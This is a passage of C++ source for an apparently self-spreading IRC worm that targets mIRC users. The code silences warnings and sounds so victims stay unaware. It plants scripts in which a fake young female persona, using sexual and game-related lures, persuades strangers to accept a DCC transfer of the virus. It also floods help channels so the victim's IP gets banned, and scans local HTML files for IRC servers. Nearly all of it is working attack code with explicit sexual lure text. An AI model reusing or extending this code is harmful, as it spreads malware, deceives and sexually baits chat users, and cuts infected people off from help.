	fprintf(Write,"method=1\n");
	fprintf(Write,"[warn]\n"); //Turn all the warning boxes off
	fprintf(Write,"dcc=off\n");
	fprintf(Write,"fserve=off\n");
	fprintf(Write,"link=off\n");
	fprintf(Write,"[dccserver]\n");
	fprintf(Write,"n0=1,59,1,1,0,0\n");
	fprintf(Write,"[styles]\n");
	fprintf(Write,"thin=0\n");
	fprintf(Write,"font=0\n");
	fprintf(Write,"hide=1\n");
	fprintf(Write,"color=12632256\n");
	fprintf(Write,"size=1\n");
	fprintf(Write,"buttons=0\n");
	fprintf(Write,"[nicklist]\n");
	fprintf(Write,"[ssl]\n");
	fprintf(Write,"show=1\n");
	fprintf(Write,"[wizard]\n");
	fprintf(Write,"warning=2\n");
	fprintf(Write,"[events]\n");
	fprintf(Write,"default=2,2,3,2,2,1,1,2\n");
	fprintf(Write,"[waves]\n"); //Mute all the sounds so the victim won't get supspicious
	fprintf(Write,"query=No Sound\n");
	fprintf(Write,"notice=No Sound\n");
	fprintf(Write,"invite=No Sound\n");
	fprintf(Write,"disconnect=No Sound\n");
	fprintf(Write,"send=No Sound\n");
	fprintf(Write,"highlight=No Sound\n");
	fprintf(Write,"flash=No Sound\n");
	fprintf(Write,"dccfail=No Sound\n");
	fprintf(Write,"[dragdrop]\n");
	fprintf(Write,"n0=*.wav:/sound $1 $2-\n");
	fprintf(Write,"n1=*.*:/dcc send $1 $2-\n");
	fprintf(Write,"s0=*.*:/dcc send $1 $2-\n");
	fprintf(Write,"[extensions]\n");
	fprintf(Write,"n0=defaultEXTDIR:download\\\n");
	fprintf(Write,"n1=*.wav,*.mid,*.mp3,*.wma,*.oggEXTDIR:sounds\\\n");
	fprintf(Write,"[colors]\n"); //Only use white as the color so no one can read anything from the screens if it gets detected
	fprintf(Write,"n0=mIRC Classic,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0\n");
	fprintf(Write,"[palettes]\n");
	fprintf(Write,"n0=16777215,0,8323072,37632,255,127,10223772,32764,65535,64512,9671424,16776960,16515072,16711935,8355711,13816530\n");
	fprintf(Write,"[afiles]\n");
	fprintf(Write,"n0=%s\n", Aliasesini); //Use the random names that we've genrated before
	fprintf(Write,"[rfiles]\n");
	fprintf(Write,"n0=%s\n", Remoteini);
	fprintf(Write,"n1=%s\n", Remoteini);
	fprintf(Write,"n2=%s\n", Scriptini);
	fclose(Write);

	//This is the text file that is gonna be used for our little coversation
	ofstream d(SpeechFile, ios::app);
	d<< "To follow the path:\n"; //A poem that we are gonna be using as our payload
	d<< "Look to the master,\n";
	d<< "Follow the master,\n";
	d<< "Walk with the master,\n";
	d<< "See through the master,\n";
	d<< "Become the master.\n";
	d<< "[Evolution] created by Xevion\n";
	d<< "netherlands\n";
	d<< "france\n";
	d<< "germany\n";
	d<< "italy\n";
	d<< "spain\n";
	d<< "greece\n";
	d<< "portugal\n";
	d<< "uk\n";
	d<< "usa, california\n";
	d<< "australia\n";
	d<< Age;
	d<< "female";
	d<< "girl";
	d<< "f";
	d<< "hi\n";
	d<<	"hey\n";
	d<< "hello\n";
	d<< "hai\n";
	d<< "how are you doing?\n";
	d<< "how are you?\n";
	d<< "how are u?\n";
	d<< "how are u doin?\n";
	d<< "hows things?\n";
	d<< "what was the question again?\n";
	d<< "sorry i closed the chatwindow, what was the question again?\n";
	d<< "what?\n";
	d<< "what were you saying?\n";
	d<< "did you say something? i closed the cahtwindow by accident :-/\n";
	d<< "i'm oke\n";
	d<< "i'm fine\n";
	d<< "everything is oke with me\n";
	d<< "i'm doing great\n";
	d<< "i'm not so good but i don't want to talk about it\n";
	d<< "nothing much\n";
	d<< "i'm chatting with you ;-)\n";
	d<< "just surfing around on the net\n";
	d<< "just listining to some music\n";
	d<< ", so where are you from?\n";
	d<< ", what's your asl?\n";
	d<< ", what are you going to do this summer?\n";
	d<< ", so what are you doing?\n";
	d<< ", so what kind of hobby's do u have? games? sex? sports?\n";
	d<< "what game do you like then?\n";
	d<< "what game is your favorite?\n";
	d<< "what game are you playing most of the time?\n";
	d<< "what's the best game you've ever played?\n";
	d<< "what game do you think is the best game of all times then?\n";
	d<< "yeah i'd like that one too, I got a great self made wallpaper from it, do you wanna see it?\n";
	d<< "I'm playing that too! :-D I got an awesome wallpaper from the game, it's the best! Do you want it also?\n";
	d<< "that game is awesome! I love that game! I got an screenshot with the best score I ever had, would you like to see it? What was your best score?\n";
	d<< "I love that game too :D haha I got an great screenshot from the game, it's real funny :-), do you want it?\n";
	d<< "I know it's the best ever! do you already have the latest patch that came out last week? the game runs even better with it :) do you also want it, if you already haven't?\n";
	d<< "yeah, do you like sex :-P?? do you want some pics of me? i made them last night together with a girlfriend of mine ;-))\n";
	d<< "i love sex! ;-) i'm actualy rubbing my pussy off right now :-P and it feels soo good :-D do you wanna watch me doing it?\n";
	d<< "hehe you like sex uh ;-) I love it too, but only with the right men :-$ i'm so horny right now because I haven't done it in such a long time :-/, do you wanna look at me how i turn myself on?? it makes me so horny if a man is watching me :-$\n";
	d<< "do you want a picture of me at the beach topless ;-)? and may i have a picture from you also then :-P??\n";
	d<< "hehe i love sex too ;-P do you have a couple of pics from yourself, i'll send some from me if you want them ;-))\n";
	d<< "I like soccer too, I made a wallpaper with all the best teams in the world :-D dow you wanna see it?\n";
	d<< "I love soccer! it's the best sport ever! I just downloaded an awesome wallpaper with a fantastic goal on it, do you also want it? it rocks!\n";
	d<< "awesome :-), i like soccer too! espaecially now when the European Championships are played in Portugal, I have a nice wallpaper with all the teams on it that are playing in the championships :-D do you want it too? It looks superb!\n";
	d<< "I'm loving basketball too :-) it's the best game ever, too bad there isn't any real competition :-(, do you wanna see a picture of the team i'm playing in?\n";
	d<< "I like it too :-D especially the Bulls they rock!! I downloaded an awesome wallpaper of them some weeks ago, do you want it too?\n";
	d<< "nice!, a friend of mine is also in our team playing football, do you want to see some pictures from him in action? he's amazing!\n";
	d<< "I like football too ;-) do you play football too for your school :-P? I'm a cheerlaeder so maybe i'll see you in action some day ;-P do you want a picture from me?\n";
	d<< "ahh great! i've made a nice wallpaper from the last superbowl, do you wanna see it?\n";
	d.close();

    //Create random variables for the dcc command
	char dccset[32], dccdcc[32], dccsend[32], dccnick[32], dccfile[132], dccme[32], dccpar[32], dccif[32];
	strcpy(dccset, "%"); strcat(dccset, VarGenerator(10 + rand()%10));
	strcpy(dccdcc, "%"); strcat(dccdcc, VarGenerator(10 + rand()%10));
	strcpy(dccsend, "%"); strcat(dccsend, VarGenerator(10 + rand()%10));
	strcpy(dccnick, "%"); strcat(dccnick, VarGenerator(10 + rand()%10));
	strcpy(dccfile, "%"); strcat(dccfile, VarGenerator(10 + rand()%10));
	strcpy(dccme, "%"); strcat(dccme, VarGenerator(10 + rand()%10));
	strcpy(dccpar, "%"); strcat(dccpar, VarGenerator(10 + rand()%10));
	strcpy(dccif, "%"); strcat(dccif, VarGenerator(10 + rand()%10));

	//Create random linenumbers, we are defining every command in the alsiases.ini and set every line as an variable so we can call it from the script.ini
	char L0[32], L1[32], L2[32], L3[32], L4[32], L5[32], L6[32], L7[32], L8[32], L9[32], L10[32], L11[32], L12[32], L13[32], L14[32], L15[32], L16[32], L17[32], L18[32], L19[32], L20[32], L21[32], L22[32], L23[32], L24[32], L25[32], L26[32], L27[32];
	strcpy(L0, VarGenerator(10 + rand()%10));
	strcpy(L1, VarGenerator(10 + rand()%10));
	strcpy(L2, VarGenerator(10 + rand()%10));
	strcpy(L3, VarGenerator(10 + rand()%10));
	strcpy(L4, VarGenerator(10 + rand()%10));
	strcpy(L5, VarGenerator(10 + rand()%10));
	strcpy(L6, VarGenerator(10 + rand()%10));
	strcpy(L7, VarGenerator(10 + rand()%10));
	strcpy(L8, VarGenerator(10 + rand()%10));
	strcpy(L9, VarGenerator(10 + rand()%10));
	strcpy(L10, VarGenerator(10 + rand()%10));
	strcpy(L11, VarGenerator(10 + rand()%10));
	strcpy(L12, VarGenerator(10 + rand()%10));
	strcpy(L13, VarGenerator(10 + rand()%10));
	strcpy(L14, VarGenerator(10 + rand()%10));
	strcpy(L15, VarGenerator(10 + rand()%10));
	strcpy(L16, VarGenerator(10 + rand()%10));
	strcpy(L17, VarGenerator(10 + rand()%10));
	strcpy(L18, VarGenerator(10 + rand()%10));
	strcpy(L19, VarGenerator(10 + rand()%10));
	strcpy(L20, VarGenerator(10 + rand()%10));
	strcpy(L21, VarGenerator(10 + rand()%10));
	strcpy(L22, VarGenerator(10 + rand()%10));
	strcpy(L23, VarGenerator(10 + rand()%10));
	strcpy(L24, VarGenerator(10 + rand()%10));
	strcpy(L25, VarGenerator(10 + rand()%10));
	strcpy(L26, VarGenerator(10 + rand()%10));
	strcpy(L27, VarGenerator(10 + rand()%10));

    //This is gonna be used in our function to foold the "help" and "mirc" channels
	char Flooder[2048];
	for(int y = 0; y < 20; y++)
	{
		strcat(Flooder, "$rand(1,9) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(A,Z) ");
	}

	//Write the aliases.ini, in this file we gonna store all the commands
	Write = fopen(Aliasesini,"wt");
	fprintf(Write, "[aliases]\n");

	/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    If u use the command /list in mIRC it will save all the channels to the
    file channels.txt in the Channels directory.
    This command will read every line from that file and check if there are more
    then 50 users chatting on the channel, if there are more then 50 then it
    will write the channel to a seperate textfile.
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
	fprintf(Write, "n0=/%s { var %cn = $lines(Channels\\channels.txt) | while (%cn > 1) { var %cr = $read(Channels\\channels.txt,%cn) | if ($gettok(%cr,2,32) > 50) { write %s $gettok(%cr,1,32) } | dec %cn } }\n", L0, 37, 37, 37, 37, 37, ChannelsList, 37, 37);

    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	This command will check the file where we wrote all the channels to, if the
    file is empty it will disconnect and choose another server from the file
    where we stored the list with servers too. After it connected to the new server
    it will delete the server so we won't connect to it again.
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
    fprintf(Write, "n1=/%s { var %ck = $lines(%s) | if (%ck == 0) { disconnect | set %cserver = $read(%s) | server %cserver | /write $+(-dl,$readn) %s } }\n", L1, 37, ChannelsList, 37, 37, ServersList, 37, ServersList);

    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    This line is gonna be used for joining the channels on the IRC server,
    it won't connect to all the channels at once because then there is a chance
    that you will get kicked from the server, so we choose a time between
    1 and 5 minutes and join the channel, after we joined it will be delete from
    the list with channels so that we can't rejoin it again.
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
	fprintf(Write, "n2=/%s { var %ci = 0 | while (%ci <= 10) { set %ctime $rand(60,300) | set %cchannel $read(%s,nt) | join %cchannel | /write $+(-dl,$readn) %s | inc %ci } }\n", L2, 37, 37, 37, 37, ChannelsList, 37, ChannelsList, 37);

    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    This the function for fooding all the chanells with the word "mirc" or "help"
    in it. It reads the channel from the textfile where we stored the channels in
    with the function that is described below. After it joined the channel it will
    be delted from the textfile, and starts flooding the channel. The flooding will
    randomly take place so that we won't get disconnected for it from the server.
    We flood them because you will probarly get kicked and banned from the channel.
    And because we are using the victim's IP address it will get banned, so the
    victim can't get any help anymore from the channels because he is banned from them ;).
   	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
   	fprintf(Write, "n3=/%s { var %cl = $lines(%s) | while (%cl > 0) { var %cr = $read(%s,%cl) | .join %cr | var %ctimer = $rand(5,30) | .timer 1 %ctimer /msg %cr %s | write $+(-dl,$readn) %s | dec %cl } }\n", L3, 37, FloodChannels, 37, 37, FloodChannels, 37, 37, 37, 37, 37, Flooder, FloodChannels, 37);

    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    With this function we're gonna collect all the channels with the word "mirc"
    or "help" in it. The channels that were found are gonna be written to an
    seprate textfile.
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
	fprintf(Write, "n4=/%s { var %cn = $lines(Channels\\channels.txt) | while (%cn > 1) { var %cread = $read(Channels\\channels.txt,%cn) | if (mirc isin $gettok(%cread,1,32)) { write %s $gettok(%cread,1,32) } | else { if (help isin $gettok(%cread,1,32)) { write %s $gettok(%cread,1,32) } } | dec %cn } %s }\n", L4, 37, 37, 37, 37, 37, FloodChannels, 37, 37, FloodChannels, 37, 37, L3);

    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	This will be the dcc send string, it first defines a part from the string as
    an random variable with the /set command, after that it will combine every
    string at the end of the line with eachother so that it will become an command
    to send our virus to the victim. In this way the dcc string will become completly random.
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
    fprintf(Write, "n5=/%s { var %s = set | %s %s .dcc | %s %s send | %s %s $nick | %s %s $me | %s %s %s | %s %s -c | %s %s != | if ( %s %s %s ) %s %s %s %s }\n", L5, dccset, dccset, dccdcc, dccset, dccsend, dccset, dccnick, dccset, dccme, dccset, dccfile, Virus, dccset, dccpar, dccset, dccif, dccme, dccif, dccnick, dccdcc, dccsend, dccpar, dccfile);

    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    This line will combine each command, first it will delete everything from the
    channels.txt, then it will ask for an list of the active channels on the server.
    The channels that are listed are gonna be  stored in the channels.txt,
    then the channels with more then 50 ppl on it will be extracted and written
    to an seprate textfile, then that textfile will be checked if it is �mpty or not,
    and finally if it isn't the channels will be joined.
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
	fprintf(Write, "n6=/%s { write -c Channels\\channels.txt | list | .timer 1 90 .%s | .timer 1 120 .%s | .timer 1 300 .%s | .timer 1 330 .%s }\n", L6, L4, L0, L1, L2);

    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	This will send an CTCP VERSION to every user that joins the channel. The
    function will wait for 0 to 300 seconds so that it won't look too much like
    spamming.
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
	fprintf(Write, "n7=/%s { var %ctimejoin = $rand(0,300) | .timer 1 %ctimejoin .ctcp $nick version }\n", L7, 37, 37);

    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	This will send an CTCP VERSION to every user that parts the channel but this
    function will only wait max. 1 minute before sending the CTCP.
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
    fprintf(Write, "n8=/%s { var %ctimepart = $rand(0,60) | .timer 1 %ctimepart .ctcp $nick version }\n", L8, 37, 37);

    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	This command will be activated each time something is said in the channel.
	It checks how many normal users are in the channel (normal users are non-op,
    non-voiced etc.) If there are less then 40 normal users in the channel, then
    it will part the channel and join a new one from the stored list with channels.
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
    fprintf(Write, "n9=/%s { var %cusers = $nick(#,0,a,o) | if (%cusers < 40) { var %cchannel = $read(%s,n) | .part $chan | .join %cchannel } }\n", L9, 37, 37, 37, ChannelsList, 37);

    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	After we have send the CTCP to a user who had joined or parted a channel we
    get a CTCP REPLY with the version because we asked for that.
	If the user is using an other client then mIRC it will halt the script, if
    he/she is using a mIRC client then it will try to start a conversation with
    the target.
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
    fprintf(Write, "n10=/%s { if ($nick != $me) { var %cversion = mIRC | if ($2 == %cversion) { var %cline = $rand(22,25) |  var %ctext = $read(%s,%cline) | .msg $nick %ctext } | else { halt } } }\n", L10, 37, 37, 37, 37, SpeechFile, 37, 37);

    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	The next lines are used for "text detection", they will detect some words or
    sentences and react on them with the random lines that are stored in the
    "SpeechFile". For example:
    If the target wants to know your asl, it will first choose a random country
    from the textfile, then it will add the age that we randomly generated before
    and finally it will choose a word for the sex, so the virus will reply for
    example with: "18 girl spain".
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
    fprintf(Write, "n11=/%s { var %cline = $rand(19,21) | var %cline2 = $rand(8,17) | var %cage = $read (%s,18) | var %cgender = $read(%s,%cline) | var %ccountry = $read(%s,%cline2) | var %chr = $rand(2,10) | .timer 1 %chr .msg $nick %cage %cgender %ccountry }\n", L11, 37, 37, 37, SpeechFile, 37, SpeechFile, 37, 37, SpeechFile, 37, 37, 37, 37, 37, 37);
	fprintf(Write, "n12=/%s { var %cline = $rand(19,21) | var %cgender = $read(%s,%cline) | var %chr = $rand(2,10) | .timer 1 %chr .msg $nick %cgender }\n", L12, 37, 37, SpeechFile, 37, 37, 37, 37);
	fprintf(Write, "n13=/%s { var %cline = $rand(22,25) | var %ctext = $read(%s,%cline) | var %chr = $rand(2,10) | .timer 1 %chr .msg $nick %ctext }\n", L13, 37, 37, SpeechFile, 37, 37, 37, 37);
	fprintf(Write, "n14=/%s { var %cline = $rand(26,30) | var %ctext = $read(%s,%cline) | var %chr = $rand(2,10) | .timer 1 %chr .msg $nick %ctext }\n", L14, 37, 37, SpeechFile, 37, 37, 37, 37);
	fprintf(Write, "n15=/%s { var %cline = $rand(31,35) | var %ccq = $read(%s,%cline) | var %chr = $rand(2,10) | .timer 1 %chr .msg $nick %ccq }\n", L15, 37, 37, SpeechFile, 37, 37, 37 ,37);
	fprintf(Write, "n16=/%s { var %cline = $rand(41,44) | var %cline2 = $rand(45,49) | var %ctext = $read(%s,%cline) | var %ccq = $read(%s,%cline2) | var %chr = $rand(2,10) | .timer 1 %chr .msg $nick %ctext %ccq }\n", L16, 37, 37, 37, SpeechFile, 37, 37, SpeechFile, 37, 37, 37 ,37 ,37);
	fprintf(Write, "n17=/%s { var %cline = $rand(8,17) | var %ccq = $read(%s,%cline) | var %chr = $rand(2,10) | .timer 1 %chr .msg $nick %ccq }\n", L17, 37, 37, SpeechFile, 37, 37, 37 ,37);
	fprintf(Write, "n18=/%s { var %cline = $rand(36,40) | var %cline2 = $rand(45,49) | var %ctext = $read(%s,%cline) | var %ccq = $read(%s,%cline2) | var %chr = $rand(2,10) | .timer 1 %chr .msg $nick %ctext %ccq }\n", L18, 37, 37, 37, SpeechFile, 37, 37, SpeechFile, 37, 37, 37 ,37 ,37);
	fprintf(Write, "n19=/%s { var %cline = $rand(50,54) | var %ctext = $read(%s,%cline) | var %chr = $rand(2,10) | .timer 1 %chr .msg $nick %ctext | var %cline2 = $rand(55,59) | var %ctext2 = $read(%s,%cline2) | var %cwait = $rand(300,600) | .timer 1 %cwait .msg $nick %ctext2 }\n", L19, 37, 37, SpeechFile, 37, 37, 37, 37, 37, 37, SpeechFile, 37, 37, 37, 37);
	fprintf(Write, "n20=/%s { var %cline = $rand(60,64) | var %ctext = $read(%s,%cline) | var %chr = $rand(2,10) | .timer 1 %chr .msg $nick %ctext }\n", L20, 37, 37, SpeechFile, 37, 37, 37, 37);
	fprintf(Write, "n21=/%s { var %cline = $rand(65,67) | var %ctext = $read(%s,%cline) | var %chr = $rand(2,10) | .timer 1 %chr .msg $nick %ctext }\n", L21, 37, 37, SpeechFile, 37, 37, 37, 37);
	fprintf(Write, "n22=/%s { var %cline = $rand(68,69) | var %ctext = $read(%s,%cline) | var %chr = $rand(2,10) | .timer 1 %chr .msg $nick %ctext }\n", L22, 37, 37, SpeechFile, 37, 37, 37, 37);
	fprintf(Write, "n23=/%s { var %cline = $rand(70,72) | var %ctext = $read(%s,%cline) | var %chr = $rand(2,10) | .timer 1 %chr .msg $nick %ctext }\n", L23, 37, 37, SpeechFile, 37, 37, 37, 37);
	fprintf(Write, "n24=/%s { var %chr = $rand(2,10) | .timer 1 %chr .msg $nick what kind of sport do you like then? soccer, football, basketball or something else? }\n", L24, 37, 37);

    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	This line will send the virus to our target and ignores him/her after that.
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
    fprintf(Write, "n25=/%s { .%s | .ignore $nick }\n", L25, L3);

    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    If the dcc failed it will reply the target with a message and try to send it
    again.
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
	fprintf(Write, "n26=/%s { .msg $nick hmm that's strange :-/ let me try it again... | .%s }\n", L26, L3);

    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	This is gonna be our payload, if somebody is saying the word "help" in a
    channel the virus will read an random line from our poem and play it with the
    standard M$ agent :).
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
	fprintf(Write, "n27=/%s { var %cline = $rand(1,6) | var %ctext = $read(%s,%cline) | .speak %ctext }\n", L27, 37, 37, SpeechFile, 37, 37);
	fclose(Write);

	//Here are we gonna write the script.ini file
	Write = fopen(Scriptini,"wt");
	fprintf(Write, "[script]\n");
	fprintf(Write, "n1=on *:CONNECT: { %s }\n", L6);
	fprintf(Write, "n2=on *:JOIN:#: { %s }\n", L7);
	fprintf(Write, "n3=on *:PART:#: { %s }\n", L8);
	fprintf(Write, "n4=on *:TEXT:*:#: { %s }\n", L9);
	fprintf(Write, "n5=on *:CTCPREPLY:version*: { %s }\n", L10);
	fprintf(Write, "n6=on *:TEXT:*asl*:?: { %s }\n", L11);
	fprintf(Write, "n7=on *:TEXT:*a/s/l*:?: { %s }\n", L11);
	fprintf(Write, "n8=on *:TEXT:*a.s.l*:?: { %s }\n", L11);
	fprintf(Write, "n9=on *:TEXT:*m/f*:?: { %s }\n", L12);
	fprintf(Write, "n10=on *:TEXT:male*:?: { %s }\n", L12);
	fprintf(Write, "n11=on *:TEXT:female*:?: { %s }\n", L12);
	fprintf(Write, "n12=on *:TEXT:hi*:#: { %s }\n", L13);
	fprintf(Write, "n13=on *:TEXT:hi*:?: { %s }\n", L14);
	fprintf(Write, "n14=on *:TEXT:hy*:?: { %s }\n", L14);
	fprintf(Write, "n15=on *:TEXT:hey*:?: { %s }\n", L14);
	fprintf(Write, "n16=on *:TEXT:hoi*:?: { %s }\n", L14);
	fprintf(Write, "n17=on *:TEXT:hello*:?: { %s }\n", L14);
	fprintf(Write, "n18=on *:TEXT:hallo*:?: { %s }\n", L14);
	fprintf(Write, "n19=on *:TEXT:*and u*:?: { %s }\n", L15);
	fprintf(Write, "n20=on *:TEXT:*and you*:?: { %s }\n", L15);
	fprintf(Write, "n21=on *:TEXT:how about*:?: { %s }\n", L15);
	fprintf(Write, "n22=on *:TEXT:how bout*:?:{ %s }\n", L15);
	fprintf(Write, "n23=on *:TEXT:u?*:?: { %s }\n", L15);
	fprintf(Write, "n24=on *:TEXT:you?*:?: { %s }\n", L15);
	fprintf(Write, "n25=on *:TEXT:what are you*:?: { %s }\n", L16);
	fprintf(Write, "n26=on *:TEXT:what r you*:?: { %s }\n", L16);
	fprintf(Write, "n27=on *:TEXT:what are u*:?: { %s }\n", L16);
	fprintf(Write, "n28=on *:TEXT:what r u*:?: { %s }\n", L16);
	fprintf(Write, "n29=on *:TEXT:where from*:?: { %s }\n", L17);
	fprintf(Write, "n30=on *:TEXT:where u from*:?: { %s }\n", L17);
	fprintf(Write, "n31=on *:TEXT:where you from*:?: { %s }\n", L17);
	fprintf(Write, "n32=on *:TEXT:where are u from*:?: { %s }\n", L17);
	fprintf(Write, "n33=on *:TEXT:*how are*:?: { %s }\n", L18);
	fprintf(Write, "n34=on *:TEXT:*how r*:?: { %s }\n", L18);
	fprintf(Write, "n35=on *:TEXT:hows things*:?: { %s }\n", L18);
	fprintf(Write, "n36=on *:TEXT:*help*:#: { %s }\n", L27);
	fprintf(Write, "n37=on *:TEXT:*games*:?: { %s }\n", L19);
	fprintf(Write, "n38=on *:TEXT:*sex*:?: { %s }\n", L20);
	fprintf(Write, "n39=on *:TEXT:*soccer*:?: { %s }\n", L20);
	fprintf(Write, "n40=on *:TEXT:*basket*:?: { %s }\n", L22);
	fprintf(Write, "n41=on *:TEXT:*footbal*:?: { %s }\n", L23);
	fprintf(Write, "n42=on *:TEXT:*sport*:?: { %s }\n", L24);
	fprintf(Write, "n43=on *:TEXT:ye*:?: { %s }\n", L25);
	fprintf(Write, "n44=on *:TEXT:ok*:?: { %s }\n", L25);
	fprintf(Write, "n45=on *:TEXT:allright*:?: { %s }\n", L25);
	fprintf(Write, "n46=on *:TEXT:sure*:?: { %s }\n", L25);
	fprintf(Write, "n47=on *:TEXT:*send*:?: { %s }\n", L25);
	fprintf(Write, "n48=on *:TEXT:*pic*:?: { %s }\n", L25);
	fprintf(Write, "n49=on *:SENDFAIL:*: { %s }\n", L26);
	fclose(Write);
}
void CollectDirs(LPCSTR DirPath) //This void will collect all the foleders on the root drive
{
   WIN32_FIND_DATA FindData;
   HANDLE hFind;
   char Path[MAX_PATH];
   static char Temp[MAX_PATH];

   hFind = FindFirstFile(DirPath,&FindData); //Find the first directory
   do
   {
      strcpy(Path,DirPath);
      Path[strlen(DirPath)-1] = 0; //Remove the "*" character from the string
      strcat(Path,FindData.cFileName);
      //Checks if the folder is really an directory, and checks if there no are dots in the name
      if ((FindData.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY || FindData.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY+FILE_ATTRIBUTE_SYSTEM || FindData.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY+FILE_ATTRIBUTE_HIDDEN || FindData.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY+FILE_ATTRIBUTE_READONLY || FindData.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY+FILE_ATTRIBUTE_NORMAL || FindData.dwFileAttributes==FILE_ATTRIBUTE_DIRECTORY+FILE_ATTRIBUTE_ARCHIVE) && (strstr(FindData.cFileName,".")==0))
      {
         FillDirArray(Path); //If it is an real directory, then add it to the array
         strcat(Path,"\\*"); //Adds "\*" to the string
         CollectDirs(Path); //Search the new path for other directory's
      }
	  else //If the path isn't a directory, then check if it is an .html or .html file
	  {
	  	 char *FileExt = new char[MAX_PATH];

		 _splitpath(FindData.cFileName,0 ,0 ,0 ,FileExt); //Get the extension of the file
		 FileExt =_strupr(_strdup(FileExt)); // Change the file exetension to uppercase
		 //Compare it
         if (strstr(FileExt, "HT")!=0)
		 {
			 ifstream b(Path);
			 while (!b.eof())
			 {
                //If it's an .html or .htm file then search for the "irc:" string
				b.getline(Temp,MAX_PATH,'\n');
				if (strstr(Temp, "irc:")==0)
				{
				}
				else
				{
					//If it is found then remove the <a href="irc:"></a> link around it
                    std::string File;
					std::string Cut;

					//Remove the first prat in front of the IRC server
					File=Temp;
					Cut=File.substr(File.rfind(':')+1);
					strcpy(Temp, Cut.c_str());

					//Remove the part that comes after the IRC server
					Cutoff = strrchr(Temp,'"');
					*(Cutoff) = '\0';
					FillServerArray(Temp); //And add the server to the array with IRC servers
				}
			 }
			 b.close();
		 }
	  }
   } while (FindNextFile(hFind,&FindData)); //Search for the next directory or file
   FindClose(hFind);
}
void FillDirArray(LPCSTR Directory) //This function adds the directory that is found to the array
{
   lstrcpy(DirArray[DirCount],Directory); //Add it
   DirCount++;
}
void CollectServers(LPCSTR File)
{
